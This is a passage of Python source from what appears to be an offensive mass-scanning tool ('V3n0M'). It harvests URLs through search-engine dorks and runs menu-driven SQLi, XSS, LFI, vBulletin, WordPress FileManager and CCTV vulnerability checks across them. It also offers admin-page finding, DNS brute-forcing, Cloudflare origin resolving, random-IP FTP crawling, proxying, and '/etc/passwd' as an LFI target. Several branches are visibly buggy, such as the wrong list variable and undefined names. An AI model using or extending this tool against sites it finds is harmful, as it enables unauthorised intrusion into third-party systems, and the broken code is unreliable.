    urls = []
    urls_len_last = 0
    timestart = datetime.now()
    for site in sitearray:
        progress = 0
        for dork in loaded_Dorks:
            progress += 1
            page = 0
            while page < int(pages_pulled_as_one):
                query = dork + " site:" + site
                futures = []
                loop = asyncio.get_event_loop()
                for i in range(25):
                    results_web = (
                        "http://www.bing.com/search?q="
                        + query
                        + "&go=Submit&first="
                        + str((page + i) * 50 + 1)
                        + "&count=50"
                    )
                    futures.append(
                        loop.run_in_executor(None, ignoring_get, results_web)
                    )
                page += 25
                stringreg = re.compile('(?<=href=")(.*?)(?=")')
                names = []
                for future in futures:
                    result = await future
                    names.extend(stringreg.findall(result))
                domains = set()
                for name in names:
                    basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
                    if basename is None:
                        basename = re.search(r"(?<=://).*", name)
                    if basename is not None:
                        basename = basename.group(0)
                    if basename not in domains and basename is not None:
                        domains.add(basename)
                        urls.append(name)
                totalprogress = len(loaded_Dorks)
                percent = int((1.0 * progress / int(totalprogress)) * 100)
                urls_len = len(urls)
                os.system("clear")
                start_time = datetime.now()
                timeduration = start_time - timestart
                ticktock = timeduration.seconds
                hours, remainder = divmod(ticktock, 3600)
                minutes, seconds = divmod(remainder, 60)
                sys.stdout.flush()
                logo()
                sys.stdout.write(
                    W + "\r\x1b[ " + R + "| Thx, domain <%s> has been targeted. \n "
                    "| Collected <%s> URLs since start of scan. \n"
                    " | D0rks: %s/%s progressed so far. \n"
                    " | Percent Done: %s. \n"
                    " | Current page no.: <%s>. \n"
                    " | Dork In Progress: %s. \n"
                    " | Elapsed Time: %s. \n"
                    % (
                        R + site,
                        repr(urls_len),
                        progress,
                        totalprogress,
                        repr(percent),
                        repr(page),
                        dork,
                        "%s:%s:%s" % (hours, minutes, seconds),
                    )
                )
                sys.stdout.flush()
                if urls_len == urls_len_last:
                    page = int(pages_pulled_as_one)
                urls_len_last = urls_len
    tmplist = []

    print("\n\n[+] URLS (unsorted): ", len(urls))
    for url in urls:
        unsorted.append(url)
        try:
            host = url.split("/", 3)
            domain = host[2]
            for site in sitearray:
                if (
                    domain not in tmplist
                    and "=" in url
                    and any(x in url for x in sitearray)
                ):
                    finallist.append(url)
                    tmplist.append(domain)
        except KeyboardInterrupt:
            os.system("clear")
            chce1 = input(":")
            logo()
            print(G + "Program Paused" + R)
            print("[1] Unpause")
            print("[2] Skip rest of scan and continue with current results")
            print("[3] Return to main menu")
            if chce1 == "1":
                return
            if chce1 == "2":
                scan_option()
            if chce1 == "3":
                f_menu()
            else:
                pass
            continue
    print("[+] URLS (sorted) with rubbish removed: ", len(finallist))
    return finallist


def f_menu():
    import time
    global proxy
    global vuln_scan_count
    global vuln
    global customlist
    global proxy_ip
    global proxy_port
    vuln_scan_count = []
    vuln = []
    if endsub != 1:
        scan_option()
    logo()
    print(R + "[1] Dork and Vuln Scan")
    print("[2] Admin page finder")
    print("[3] Toxin - Mass IP/port/services *Not Released Yet* ")
    print("[4] DNS brute")
    print("[5] Cloudflare Resolving")
    print("[6] XSSTRIKE (thx to @s0md3v!)")
    print("[7] Misc Options")
    print("[8] Proxy Settings")
    print("[0] Exit\n")
    chce = input(":")

    if chce == "1":
        print(W + "")
        f_scan()
    elif chce == "2":
        afsite = input("Enter the site eg target.com: ")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        findadmin = subprocess.Popen(
            "python3 "
            + pwd
            + "/modules/adminfinder.py -w lists/adminlist.txt -u "
            + str(afsite),
            shell=True,
        )
        findadmin.communicate()
        subprocess._cleanup()
    elif chce == "3":
        import time

        print(B)
        toxin.menu()
    elif chce == "4":
        target_site = input("Enter the site eg target.com: ")
        print("[1] normal scan")
        print("[2] scan ALL the things")
        scan_everything = input(":")
        att = ""
        if scan_everything == "1":
            att = str(" ")
        elif scan_everything == "2":
            att = str("att")
        print("Go bake a cake, this will take a LONG time.")
        # [*] Time elapsed 8 minutes and 17 seconds at 40.19 lookups per second.
        # Ctrl^C gives time to complete even after sigkill() rcvd. ex: 200 threads == ~10 mins.
        # You cannot stop it safely any other way. Sorry.
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(
            "python3 "
            + pwd
            + "/modules/dnsbrute.py -w lists/subdomains -u "
            + str(target_site)
            + att
            + " -t 200",  # number of threads to assign can be adjusted
            shell=True,
        )
        dnsbrute.communicate()
        subprocess._cleanup()
    elif chce == "5":
        cloudflare_resolver()
        f_menu()
    elif chce == "6":
        current = os.getcwd()
        os.chdir(current + "/modules/xss-strike")
        xss = subprocess.Popen("python V3n0mWrapper.py", shell=True)
        xss.communicate()
    elif chce == "7":
        print(W + "")
        os.system("clear")
        logo()
        print(R + "[1] Skip to SQLi list checking")
        print(" [2] SKip to XSS list checking")
        print(" [3] Skip to LFI list checking")
        print(" [4] Skip to Vbulletin 5.x list checking ")
        print(" [5] Skip to Vbulletin < 5.6.2 list checking")
        print(" [6] Skip to WordPress FileManager list checking")
        print(" [7] Skip to CCTV list checking")
        print(" [8] FTP crawler")
        print(" [9] Skip to target list")
        print("[10] Print contents of log files")
        print("[11] rm -rf cache and logs")
        print(
            "[12] Perform forced update of ALL installed Python packages and dependancies on system"
        )
        print("[13] Launch LFI Suite")
        print(" [0] Return to main menu")
        chce2 = input(":")
        if chce2 == "1":
            global col
            col = []
            sqllist = input("Enter list ")
            sqllist = [line.strip() for line in open(sqllist, "r", encoding="utf-8")]
            for url in sqllist:
                sqli_scanning(url)
                scan_count = len(vuln_scan_count)
                scan_count = str(scan_count)
            print(scan_count + " Sites scanned ")

        elif chce2 == "2":
            xsslist = input("Enter list ")
            xsslist = [line.strip() for line in open(xsslist, "r", encoding="utf-8")]
            for url in xsslist:
                xss_scanning(url)
            scan_count = len(vuln_scan_count)
            scan_count = str(scan_count)
            print(scan_count + " Sites scanned ")

        elif chce2 == "3":

            def lfi_url():
                try:
                    for url in lfilist:
                        if url not in urllist:
                            urllist.append(url)
                            lfi_scanning(url)
                        if url in urllist:
                            pass
                except exception as e:
                    print(e)

            threadcount = input("How many threads ")
            threadcount = int(threadcount)
            lfilist = input("Enter list ")
            lfilist = [line.strip() for line in open(lfilist, "r", encoding="utf-8")]
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(lfi_url)

        elif chce2 == "4":

            def vb5_url():
                for url in vb5list:
                    if url not in urllist:
                        urllist.append(url)
                        vbulletin5_scanning(url)
                    if url in urllist:
                        pass

            threadcount = input("How many threads ")
            threadcount = int(threadcount)
            vb5list = input("Enter list ")
            vb5list = [line.strip() for line in open(vb5list, "r", encoding="utf-8")]
            global sites
            sites = input("Enter site to search for ex .com ")
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(vb5_url)

        elif chce2 == "5":

            def vb56_url():
                for url in vb56list:
                    if url not in urllist:
                        urllist.append(url)
                        vb56_scanning(url)
                    if url in urllist:
                        pass

            threadcount = input("How many threads ")
            threadcount = int(threadcount)
            vb56list = input("Enter list ")
            vb56list = [line.strip() for line in open(vb56list, "r", encoding="utf-8")]
            sites = input("Enter site to search for ex .com ")
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(vb56_url)

        elif chce2 == "6":

            def wpfm_url():
                for url in wpfmlist:
                    if url not in urllist:
                        urllist.append(url)
                        wp_filemanager_scanning(url)
                    if url in urllist:
                        pass

            threadcount = input("How many threads ")
            threadcount = int(threadcount)
            wpfmlist = input("Enter list ")
            wpfmlist = [line.strip() for line in open(wpfmlist, "r", encoding="utf-8")]
            sites = input("Enter site to search for ex .com ")
            urllist = []
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(wpfm_url)

        elif chce2 == "7":
            cctvlist = input("Enter list ")
            cctvlist = [line.strip() for line in open(xsslist, "r", encoding="utf-8")]
            for url in cctvlist:
                cctv_scanning(url)
            scan_count = len(vuln_scan_count)
            scan_count = str(scan_count)
            print(scan_count + " Sites scanned ")

        elif chce2 == "8":
            randomip = input("How many IP addresses do you want to scan: ")
            current_dir = os.getcwd()
            os.chdir(current_dir + "/modules")
            ftpcrawl = subprocess.Popen("ftpcrawler.py -i " + randomip, shell=True)
            ftpcrawl.communicate()

        elif chce2 == "9":
            import target

        elif chce2 == "10":
            for filename in glob("*.txt"):
                print(filename)
            print("Dumping output of cache complete. Sleeping for 5 seconds.")
            time.sleep(5)
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for i in range(threadcount):
                    executor.submit(lfi_url)

        elif chce2 == "11":
            try:
                print("Checking if cache or logs exist.")
                time.sleep(1)
                for filename in glob("*.txt"):
                    os.remove(filename)
                    print("Cache has been cleared & all logs have been deleted.")
                    time.sleep(2)
            except Exception:
                print("No log files to flush!")

        elif chce2 == "12":
            import time

            euid = os.geteuid()
            if euid == 0:
                print(
                    "You cannot perform any upgrades or repairs while logged in as superuser."
                )
                time.sleep(6)
                killpid()
            import pip
            from subprocess import call
            import time

            print("Updating Cloudbuster files. Please wait.")
            time.sleep(3)
            for d in downloads:
                download(d[0], d[1], d[2])
            unzip("ipout.zip")
            os.replace(Path("ips-v4"), Path("./lists/ips-v4"))
            os.replace(Path("ips-v6"), Path("./lists/ips-v6"))
            print("Everything up to date!")
            print(
                "Cloudbuster features updated! Moving onto python modules and dependencies..."
            )
            time.sleep(4)
            sys.stdout.flush()
            print("Update && upgrade, then upgrade python.")
            print("You will have 10 seconds. Cancel this action with Ctrl^C.")
            time.sleep(10)
            call(
                "pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user",
                shell=True,
            )
            subprocess._cleanup()
            pass
    elif chce == "13":
        lfisuite = subprocess.Popen("python " "lfisuite.py ", shell=True)
        lfisuite.communicate()
        subprocess._cleanup()
    elif chce == "8":
        print("[1] Setup Proxy ")
        print("[2] Verify Proxy ")
        global proxies
        proxy_choice = input("Enter choice ")
        if proxy_choice == '1':
            proxy = True
            socks_choice = input("socks4 or socks5: ")
            proxy_ip = input("Enter proxy ip: ")
            proxy_port = input("Enter Proxy Port: ")
            if socks_choice.lower() == "socks5":
                proxies = {'http': 'socks5h://' + str(proxy_ip) + ':' + str(proxy_port), 'https': 'socks5h://' + str(proxy_ip) + ':' + str(proxy_port)}
            if socks_choice.lower() == 'socks4':
                proxies = {'http': 'socks4://' + str(proxy_ip) + ':' + str(proxy_port), 'https': 'socks4://' + str(proxy_ip) + ':' + str(proxy_port)}
            print(G + "Proxy Enabled" + B + "\n ...Going back to main menu ")
            time.sleep(3)
            f_menu()
        if proxy_choice == '2':
            response = requests.get('https://api.ipify.org', proxies=proxies)
            ip_address = response.text
            print(O + "Your Public IP address is:" + G +  ip_address)
            print( B + " \n...Going back to main menu ")
            time.sleep(3)
            f_menu()
    elif chce == "0":
        print(R + "\n Exiting cleanly..")
        print(W)
        sys.exit(0)


cctvs = [line.strip() for line in open("lists/CCTV", "r", encoding="utf-8")]
d0rk = [line.strip() for line in open("lists/d0rks", "r", encoding="utf-8")]
header = [line.strip() for line in open("lists/header", "r", encoding="utf-8")]
xsses = [line.strip() for line in open("lists/xsses", "r", encoding="utf-8")]
lfis = [line.strip() for line in open("lists/pathtotest.txt", "r", encoding="utf-8")]
tables = [line.strip() for line in open("lists/tables", "r", encoding="utf-8")]
columns = [line.strip() for line in open("lists/columns", "r", encoding="utf-8")]
search_ignore = [line.strip() for line in open("lists/ignore", "r", encoding="utf-8")]
sqli_errors = [
    line.strip() for line in open("lists/sqli_errors", "r", encoding="utf-8")
]
random.shuffle(header)
random.shuffle(lfis)

W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"

#    Declare a global, read counter files, and if nonzero display their values.
#
def cache_Check():
    global cachestatus
    my_file1 = Path("v3n0m-lfi.txt")
    my_file2 = Path("v3n0m-rce.txt")
    my_file3 = Path("v3n0m-xss.txt")
    my_file5 = Path("v3n0m-sqli.txt")
    my_file4 = Path("IPLogList.txt")
    if (
        my_file1.is_file()
        or my_file2.is_file()
        or my_file3.is_file()
        or my_file4.is_file()
        or my_file5.is_file()
    ):
        cachestatus = "contains some things"
    else:
        cachestatus = "empty"


# This is the counter section, to displays found SQLi, LFI, XSS vulns, etc.
# Declare global count for each saved value, display value to stderr above f_menu().
#
def sql_list_counter():
    global sql_count
    try:
        f = open("v3n0m-sqli.txt", encoding="utf-8")
        l = [x for x in f.readlines() if x != "\n"]
        sql_count = len(l)
    except FileNotFoundError:
        sql_count = 0


def lfi_list_counter():
    global lfi_count
    try:
        f = open("v3n0m-lfi.txt", encoding="utf-8")
        l = [x for x in f.readlines() if x != "\n"]
        lfi_count = len(l)
    except FileNotFoundError:
        lfi_count = 0


def xss_list_counter():
    global xss_count
    try:
        f = open("v3n0m-xss.txt", encoding="utf-8")
        l = [x for x in f.readlines() if x != "\n"]
        xss_count = len(l)
    except FileNotFoundError:
        xss_count = 0


def misc_list_counter():
    global misc_count
    try:
        f = open("v3n0m-misc.txt", encoding="utf-8")
        l = [x for x in f.readlines() if x != "\n"]
        misc_count = len(l)
    except FileNotFoundError:
        misc_count = 0


def rce_list_counter():
    global rce_count
    try:
        f = open("v3n0m-rce.txt", encoding="utf-8")
        l = [x for x in f.readlines() if x != "\n"]
        rce_count = len(l)
    except FileNotFoundError:
        rce_count = 0


list_count = 0
lfi_count = 0
subprocess.call("clear", shell=True)
arg_end = "--"
arg_eva = "+"
colMax = 60
endsub = 1
gets = 0
file = "/etc/passwd"
ProxyEnabled = False
menu = True
current_version = str("433  ")
f_menu()
